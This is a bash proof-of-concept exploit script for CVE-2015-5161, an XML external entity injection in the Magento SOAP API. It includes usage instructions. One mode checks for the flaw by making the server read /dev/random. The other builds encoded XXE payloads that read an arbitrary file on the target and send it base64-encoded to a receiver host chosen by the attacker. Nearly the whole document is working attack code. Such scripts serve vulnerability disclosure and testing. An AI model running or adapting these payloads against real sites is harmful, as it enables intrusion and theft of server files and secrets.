
#!/bin/bash
#
# POC Exploit (v1.1)
#
# eBay Magento CE  <= 1.9.2.1  XML eXternal Entity Injection (XXE) on PHP-FPM
# eBay Magento EE  <= 1.14.2.1
#
# CVE-2015-5161
#
# Credits:
#
# Dawid Golunski
# dawid (at) legalhackers.com
# http://legalhackers.com
#
# Advisories:
#
# http://legalhackers.com/advisories/eBay-Magento-XXE-Injection-Vulnerability.txt
# http://legalhackers.com/advisories/zend-framework-XXE-vuln.txt
#
# Usage:
#
# [Vulnerability test]
#
# This is to test the vulnerability with a simple XXE payload which retrieves the
# /dev/random file and causes a time out. No receiver server is required in this
# test as no data is returned.
#
# Run the script with just the URL to Magento SOAP API, with no other parameters. 
# E.g:
# ./magento-soap-exploit.sh http://apache-phpfpm/magento/index.php/api/soap/index
#
#
# [File retrieval from the remote server]
# 
# ./magento-soap-exploit.sh MAGENTO_SOAP_API_URL FILE_PATH RECEIVER_HOST RECEIVER_PORT
#
# E.g:
# ./magento-soap-exploit.sh http://apache-phpfpm/magento/index.php/api/soap/index /etc/hosts 192.168.10.5 80
#
# In this example, file extracted via the XXE attack will be sent as base64 encoded parameter to:
# http://192.168.10.5:80/fetch.php?D=[base64_string]
# You should have the receiver server/script listening on the specified port before running this exploit.
#

TIMEOUT=6
PAYLOAD_TMP_FILE="/tmp/payload-utf16.xml"

if [ $# -ne 1 ] && [ $# -ne 4 ] ; then 
        echo -e "\nUsage: \n"
        echo -e "[Vulnerability test]\n"
        echo -e "$0 MAGENTO_SOAP_API_URL"
        echo -e "E.g:"
        echo -e "$0 http://fpmserver/magento/index.php/api/soap/index\n";
        echo -e "[File retrieval]\n"
        echo -e "$0 MAGENTO_SOAP_API_URL FILE_PATH RECEIVER_HOST RECEIVER_PORT"
        echo -e "E.g:"
        echo -e "$0 http://fpmserver/magento/index.php/api/soap/index /etc/hosts 192.168.5.6 80\n";
        exit 2;
else 
        TARGETURL="$1"
fi
if [ $# -eq 4 ]; then 
        FILE="$2"
        RECEIVER_HOST="$3"
        RECEIVER_PORT="$4"
        TEST_ONLY=0
else
        TEST_ONLY=1
fi 

if [ $TEST_ONLY -eq 1 ]; then 
        # Vulnerability test 
        # Perform only a test by reading /dev/random file
        TEST_PAYLOAD_XML='<?xml version="1.0" encoding="UTF-16"?>
        <!DOCTYPE foo [  
        <!ELEMENT PoC ANY >
        <!ENTITY % xxe SYSTEM "file:///dev/random" >
                %xxe;
        ]>'

        echo "$TEST_PAYLOAD_XML" | iconv -f UTF-8 -t UTF-16 > $PAYLOAD_TMP_FILE
        echo -e "Target URL: $TARGETURL\nInjecting Test XXE payload (/dev/random). Might take a few seconds.\n"

        # Fetching /dev/random should cause the remote script to block
        # on reading /dev/random until the script times out.
        # If there is no delay it means the remote script is not vulnerable or 
        # /dev/random is not accessible.
        START=$(date +%s)
        wget -t 1 -T $TIMEOUT -O /dev/stdout $TARGETURL --post-file=$PAYLOAD_TMP_FILE
        END=$(date +%s)
        DIFF=$(expr $END \- $START )

        if [ $DIFF -eq $TIMEOUT ]; then
                echo "Vulnerable. No response from Magento for $DIFF seconds :)"
                exit 0
        else 
                echo "Not vulnerable, or there is no /dev/random on the remote server ;)"
                exit 1
        fi
else 
        # File retrieval XXE payload
        SEND_DTD="<?xml version=\"1.0\" encoding=\"UTF-8\"?>
        <!ENTITY % all \"<!ENTITY &#37; send SYSTEM 'php://filter/read=/resource=http://$RECEIVER_HOST:$RECEIVER_PORT/fetch.php?D=%file;'>\">
        %all;"
        SEND_DTD_B64="`echo "$SEND_DTD" | base64 -w0`"
        FILE_PAYLOAD_XML="<?xml version=\"1.0\" encoding=\"UTF-16\"?>
        <!DOCTYPE foo [  
        <!ENTITY % file SYSTEM \"php://filter/convert.base64-encode/resource=$FILE\">
        <!ENTITY % dtd SYSTEM \"data://text/plain;base64,$SEND_DTD_B64\">
        %dtd;

        %send;
        ]>"

        # Retrieve $FILE from the remote server and send it to $RECEIVER_HOST:$RECEIVER_PORT
        echo "$FILE_PAYLOAD_XML" | iconv -f UTF-8 -t UTF-16 > $PAYLOAD_TMP_FILE
        echo -e "Target URL: $TARGETURL\n\nInjecting XXE payload to retrieve the $FILE file..."
        echo -e "If successful, Base64 encoded result will be sent to http://$RECEIVER_HOST:$RECEIVER_PORT/fetch.php/D=[base64_result]\n"
        echo -e "If in doubt, try the vulnerability test option.\n"
        wget -t 1 -v -T $TIMEOUT -O /dev/stdout $TARGETURL --post-file=$PAYLOAD_TMP_FILE
fi

